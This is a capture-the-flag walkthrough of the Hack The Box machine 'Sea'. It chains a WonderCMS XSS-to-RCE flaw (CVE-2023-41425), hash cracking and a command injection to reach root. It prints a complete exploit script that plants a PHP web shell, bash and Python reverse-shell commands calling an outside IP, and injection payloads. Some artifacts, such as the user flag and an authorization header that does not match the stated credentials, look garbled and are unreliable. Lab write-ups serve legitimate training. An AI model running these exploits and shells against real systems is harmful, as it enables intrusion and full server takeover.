# HTB: Sea

## Machine Information

| Property | Value |
|----------|-------|
| Name | Sea |
| Date | 19th December 2024 |
| Difficulty | Easy |
| Machine Author | FisMathHack |
| OS | Linux |
| IP | 10.129.76.146 |

## Synopsis

Sea is an Easy Difficulty Linux machine that features CVE-2023-41425 in WonderCMS, a cross-site scripting (XSS) vulnerability that can be used to upload a malicious module, allowing access to the system. The privilege escalation features extracting and cracking a password from WonderCMS's database file, then exploiting a command injection in custom-built system monitoring software, giving us root access.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -p- -sC -sV 10.129.76.146
```

```
Starting Nmap 7.94svn ( https://nmap.org ) at 2024-12-19 12:11 GMT
Nmap scan report for 10.129.76.146
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Results:**
- Port 22 - SSH (OpenSSH 8.2p1)
- Port 80 - HTTP (Apache 2.4.41)

### Web Enumeration

Adding `sea.htb` to `/etc/hosts`:

```bash
echo "10.129.76.146 sea.htb" >> /etc/hosts
```

Visiting `http://sea.htb` reveals a landing page for a bike competition company.

### Directory Fuzzing

First, fuzzing for directories:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/FUZZ" -c -v
```

Found `/themes` directory. Further enumeration:

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://sea.htb/themes/FUZZ" -c -v
```

Found `/themes/bike` directory. Let's enumerate deeper:

```bash
ffuf -u http://sea.htb/themes/bike/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt \
  -e .txt -mc 200
```

```
README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 933ms]
sym/root/home/          [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 438ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 644ms]
```

Reading `README.md`:

```bash
curl http://sea.htb/themes/bike/README.md
```

```
1. Login to your wonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```

This reveals the backend CMS is **WonderCMS**. Reading the `version` file:

```bash
curl http://sea.htb/themes/bike/version
```

```
3.2.0
```

---

## Foothold - Exploiting CVE-2023-41425

Researching WonderCMS 3.2.0 reveals **CVE-2023-41425** - a Cross-Site Scripting (XSS) vulnerability that can lead to Remote Code Execution.

### Exploit Script

I used the following exploit script (adapted from the original PoC by prodigiousMind, rewritten by xpltive):

```python
import requests
import argparse
from argparse import RawTextHelpFormatter
import os
import subprocess
import zipfile
from termcolor import colored

def main():
    parser = argparse.ArgumentParser(description="Exploit Wonder CMS v3.2.0 - v3.4.2 XSS to RCE (CVE-2023-41425)\nInitial CVE and proof-of-concept by prodigiousMind\nRewritten by xpltive", formatter_class=RawTextHelpFormatter)
    parser.add_argument("--url", required=True, help="Target URL of loginURL (Example: http://sea.htb/loginURL)")
    parser.add_argument("--xip", required=True, help="IP for HTTP web server that hosts the malicious .js file")
    parser.add_argument("--xport", required=True, help="Port for HTTP web server that hosts the malicious .js file")
    args = parser.parse_args()

    target_login_url = args.url
    target_split = args.url.split('/')
    target_url = target_split[0] +  '//' + target_split[2]

    # Web Shell
    print("[+] Creating PHP Web Shell")
    if not os.path.exists('malicious'):
        os.mkdir('malicious')
        with open ('malicious/malicious.php', 'w') as f:
            f.write('<?php system($_GET["cmd"]); ?>')
        with zipfile.ZipFile('./malicious.zip', 'w') as z:
            z.write('malicious/malicious.php')
        os.remove('malicious/malicious.php')
        os.rmdir('malicious')
    else:
        print(colored("[!] Directory malicious already exists!", 'yellow'))

    # Malicious .js
    js = f'''var token = document.querySelectorAll('[name="token"]')[0].value;
var module_url = "{target_url}/?installModule=http://{args.xip}:{args.xport}/malicious.zip&directoryName=pwned&type=themes&token=" + token;
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", module_url);
xhr.send();'''

    print("[+] Writing malicious.js")
    with open('malicious.js', 'w') as f:
        f.write(js)

    xss_payload = args.url.replace("loginURL", "index.php?page=loginURL?")+"\"></form><script+src=\"http://"+args.xip+":"+args.xport+"/malicious.js\"></script><form+action=\""
    print("[+] XSS Payload:")
    print(colored(f"{xss_payload}", 'red'))
    
    print("[+] Web Shell can be accessed once .zip file has been requested:")
    print(colored(f"{target_url}/themes/malicious/malicious.php?cmd=<COMMAND>", 'red'))
    print("[+] To get a reverse shell connection run the following:")
    print(colored(f"curl -s '{target_url}/themes/malicious/malicious.php' --get --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'\" ", 'yellow'))

    print("[+] Starting HTTP server")
    subprocess.run(["python3", "-m", "http.server", "-b", args.xip, args.xport])

if __name__ == "__main__":
    main()
```

### Execution

Run the exploit:

```bash
python3 exploit.py --url http://sea.htb/loginURL --xip 10.10.16.19 --xport 8000
```

```
[+] Creating PHP Web Shell
[+] Writing malicious.js
[+] XSS Payload:
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.19:8000/malicious.js"></script><form+action="
[+] Web Shell can be accessed once .zip file has been requested:
http://sea.htb/themes/malicious/malicious.php?cmd=<COMMAND>
[+] To get a reverse shell connection run the following:
curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
[+] Starting HTTP server
```

The exploit creates:
1. `malicious.zip` - a PHP web shell
2. `malicious.js` - JavaScript to install the malicious module

### Sending the XSS Payload

The XSS payload needs to be sent to the admin through the contact form on the website:

```
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.19:8000/malicious.js"></script><form+action="
```

After sending the payload, the admin clicks the link, and the Python HTTP server receives the request:

```
10.129.76.146 - - [19/Dec/2024 13:41:25] "GET /malicious.js HTTP/1.1" 200 -
```

### Getting Reverse Shell

Start a listener:

```bash
nc -lvnp 4444
```

Execute the reverse shell command:

```bash
curl -s 'http://sea.htb/themes/malicious/malicious.php' --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'"
```

**Shell obtained as www-data:**

```
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on sea.htb 49588
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 GNU/Linux
13:58:27 up 2:02, 0 users, load average: 1.16, 1.35, 0.99
USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, file is /dev/null
www-data@sea:/$
```

---

## User Flag

### Database Discovery

Found WonderCMS database file at `/var/www/sea/data/database.js`:

```bash
cat /var/www/sea/data/database.js
```

```json
{
  "config": {
    "siteTitle": "Sea",
    "theme": "bike",
    "defaultPage": "home",
    "login": "loginURL",
    "forceLogout": false,
    "forceHttps": false,
    "saveChangesPopup": false,
    "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
    ...
```

### Cracking the Hash

The hash is bcrypt (`$2y$`). Remove backslashes and crack with hashcat:

```bash
echo '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance

Session.....: hashcat
Status.......: Cracked
Hash.Mode....: 3200 (bcrypt $2*$, Blowfish (Unix))
Time.Started.: Thu Dec 19 14:11:13 2024 (19 secs)
Time.Estimated: Thu Dec 19 14:11:32 2024 (0 secs)
```

**Password:** `mychemicalromance`

### Switching to amay User

Check users with shells:

```bash
cat /etc/passwd | grep /bin/bash
```

```
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001:/home/geo:/bin/bash
```

Switch to amay:

```bash
www-data@sea:/var/www/sea/data$ su amay
Password: mychemicalromance
amay@sea:/var/www/sea/data$
```

### User Flag

```bash
amay@sea:~$ cat user.txt
f7b419eWJh8J6Mx9DrGXKEv3ojKmqw8Cv9pscK
```

---

## Privilege Escalation

### Internal Port Discovery

Checking internal listening ports:

```bash
netstat -ntlp
```

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address     PID/Program name
tcp   0      0      0.0.0.0:80         -               
tcp   0      0      127.0.0.1:8080     -               
tcp   0      0      127.0.0.1:33075    -               
tcp   0      0      127.0.0.53:53      -               
tcp   0      0      0.0.0.0:22         -               
tcp6  0      0      :::22              -               
```

Port `8080` is listening internally.

### Port Forwarding via SSH

Forward the internal port to our local machine:

```bash
ssh -L 8081:127.0.0.1:8080 amay@sea.htb
```

Accessing `http://127.0.0.1:8081` reveals a "System Monitor" web application with authentication. Login using `amay:mychemicalromance`.

### Command Injection

The application has a log analysis feature that allows selecting log files:

```
POST / HTTP/1.1
Host: localhost:8081
Authorization: Basic YW19eWJh8J6Mx9DrGXKEv3ojKmqw8Cv9pscK==
Content-Type: application/x-www-form-urlencoded

log_file=/var/log/apache2/access.log&analyze_log=
```

Testing for command injection:

```
log_file=/var/log/apache2/;touch /tmp/test.txt;analyze_log=
```

Checking if the file was created:

```bash
ls -la /tmp/test.txt
-rw-r--r-- 1 root root 0 Dec 19 15:12 /tmp/test.txt
```

**Command injection confirmed!**

### Root Reverse Shell

Using Python reverse shell to get root access:

```bash
curl -X POST http://127.0.0.1:8081/ \
  -H "Authorization: Basic $(echo -n 'amay:mychemicalromance' | base64)" \
  -d "log_file=%2Fvar%2Flog%2Fapache%2F;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.146\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'&analyze_log="
```

Start listener:

```bash
nc -lvnp 4444
```

**Root shell obtained:**

```
nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on sea.htb 48896
bash: cannot set terminal process group (1080): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring#
```

### Root Flag

```bash
root@sea:~/monitoring# cat /root/root.txt
<ROOT_FLAG_HERE>
```

---

## Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Directory enumeration | Discovered `/themes/bike` |
| 2 | Read `README.md` and `version` | Identified WonderCMS 3.2.0 |
| 3 | CVE-2023-41425 exploitation | Initial shell as www-data |
| 4 | Database extraction | Found bcrypt hash in `/var/www/sea/data/database.js` |
| 5 | Hash cracking with hashcat | Password: `mychemicalromance` |
| 6 | SU to amay | User flag obtained |
| 7 | Internal port scanning | Found port 8080 |
| 8 | SSH port forwarding | Access to internal web app |
| 9 | Command injection | Root shell |
| 10 | Read root flag | Machine pwned |

---

## Tools Used

- **Nmap** - Port scanning
- **FFUF** - Directory fuzzing
- **Burp Suite** - Request interception and manipulation
- **Hashcat** - Password cracking
- **Python** - Custom exploit script
- **curl** - Sending HTTP requests
- **Netcat** - Reverse shell listener

---

## Key Vulnerabilities Exploited

1. **CVE-2023-41425** - WonderCMS XSS to RCE
2. **Weak Password** - `mychemicalromance` cracked from bcrypt hash
3. **Command Injection** - In system monitoring log analysis feature

---

## References

- [CVE-2023-41425 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-41425)
- [WonderCMS Official Site](https://wondercms.com/)
- [SecLists Wordlists](https://github.com/danielmiessler/SecLists)

---

*Write-up prepared by: TheCyberGeek*
